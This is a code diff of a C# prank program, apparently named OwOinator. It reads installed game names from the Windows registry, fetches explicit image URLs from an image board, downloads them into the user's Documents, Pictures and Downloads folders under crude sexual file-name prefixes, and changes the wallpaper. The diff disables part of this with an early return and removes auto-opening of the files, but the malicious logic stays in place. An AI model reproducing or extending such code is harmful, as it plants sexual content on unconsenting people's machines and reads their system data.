@@ -17,13 +17,14 @@ public class OwOinator
     {
         "lusty_argonian_", "sussy_were_wolf_", "LOONA_AWOOGA_", "homework_", "my_secret_nft_",
         "mom_dont_open_", "kobolds_fucking_kobolds_", "femboy_hooters_", "terraria_zoologist_lewd_",
-        "gay_fnaf_porn_", "lego_jesus_", "head_", "owo_rawr_x3_", "big_boobas_"
+        "gay_fnaf_porn_", "lego_jesus_", "owo_rawr_x3_", "big_boobas_"
     };
 
     private static readonly Dictionary<string, string> tag_map = new() {
         {"skyrim_special_edition", "skyrim"},
         {"scp_containment_breach_multiplayer", "scp"},
-        {"scp_secret_laboratory", "scp"}
+        {"scp_secret_laboratory", "scp"},
+        {"space_station_14_playtest", "ss13"}
     };
 
     private static readonly string[] postfix_white_list = new string[]
@@ -37,43 +38,42 @@ public class OwOinator
 
     private static readonly List<string> tagSets = new();
 
-    private static readonly List<string> theLamSauce = new();
+    private static readonly List<string> theLambSauce = new();
 
     public static void Init()
     {
         var userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
-        return;
         Analysis();
         FetchTheLambSauce();
+        return;
 
         var dirs = new List<string>();
         var depth = 0;
-        return;
 
         if (!Program.Safety)
         {
-            dirs.AddRange(FetchTheHomeWorkFolders(userPath + "\\Documents\\", ref depth));
-            dirs.AddRange(FetchTheHomeWorkFolders(userPath + "\\Pictures\\", ref depth));
-            dirs.AddRange(FetchTheHomeWorkFolders(userPath + "\\Downloads\\", ref depth));
+            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Documents\", ref depth));
+            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Pictures\", ref depth));
+            dirs.AddRange(FetchTheHomeWorkFolders(userPath + @"\Downloads\", ref depth));
         }
         else
         {
-            dirs = FetchTheHomeWorkFolders("D:\\Projects\\Programs\\Dotnet\\OwoInator\\testingrounds\\", ref depth);
+            dirs = FetchTheHomeWorkFolders(@"C:\Users\Purpl\Desktop\FiksHomeWork\testinggrounds\", ref depth);
         }
 
         for (int i = 0; i < dirs.Count; i++)
         {
-            if (theLamSauce.Count == 0)
+            if (theLambSauce.Count == 0)
                 break;
-            for (int j = 0; j < theLamSauce.Count; j++) 
+            for (int j = 0; j < theLambSauce.Count; j++) 
             {
-                GetImages(theLamSauce[Random.Shared.Next(0, theLamSauce.Count)], dirs[i] + "\\", ref j);
+                GetImages(theLambSauce[Random.Shared.Next(0, theLambSauce.Count)], dirs[i] + "\\", ref j);
             }
         }
 
         if (!Program.Safety)
-            OwOifyWallPaper(theLamSauce[Random.Shared.Next(0, theLamSauce.Count)]);
+            OwOifyWallPaper(theLambSauce[Random.Shared.Next(0, theLambSauce.Count)]);
     }
 
     private static void Analysis() {
@@ -88,7 +88,8 @@ public class OwOinator
                 {
                     if (subkey == null || subkey.GetValue("Name") == null)
                         continue;
-                    tagSets.Add((Program.Safety ? "safe_for_work " : "") + defaultTags + ((string)subkey.GetValue("Name")).Replace(" ", "_").ToLower());
+                    string tag = ((string)subkey.GetValue("Name")).Replace(" ", "_").ToLower();
+                    tagSets.Add((Program.Safety ? "pussy " : "") + defaultTags + (tag_map.ContainsKey(tag) ? tag_map[tag] : tag));
                 }
             }
         }
@@ -114,12 +115,19 @@ public class OwOinator
                 {
                     foreach (XmlNode node in res)
                     {
-                        theLamSauce.Add(node.Attributes["file_url"].Value);
+                        string url = node.Attributes["file_url"].Value;
+
+                        if (postfix_white_list.Contains(url.Split(".").Last()))
+                            theLambSauce.Add(node.Attributes["file_url"].Value);
                     }
                 }
                 catch (Exception) {}
             }
         }
+    }
+
+    public static string GetLambSauce() {
+        return Util.GetRandomString(theLambSauce.ToArray());
     }
 
     private static List<string> FetchTheHomeWorkFolders(string pth, ref int depth)
@@ -182,23 +190,11 @@ public class OwOinator
                 if (filePath != string.Empty)
                 {
                     client.DownloadFile(url, filePath);
-                    if (!Program.Safety)
-                        Open(filePath);
                 }
             }
-
             i++;
         }
         catch {}
-    }
-
-    private static void Open(string path)
-    {
-        using Process fileOpener = new Process();
-
-        fileOpener.StartInfo.FileName = "explorer";
-        fileOpener.StartInfo.Arguments = path;
-        fileOpener.Start();
     }
 
     private static void OwOifyWallPaper(string url)
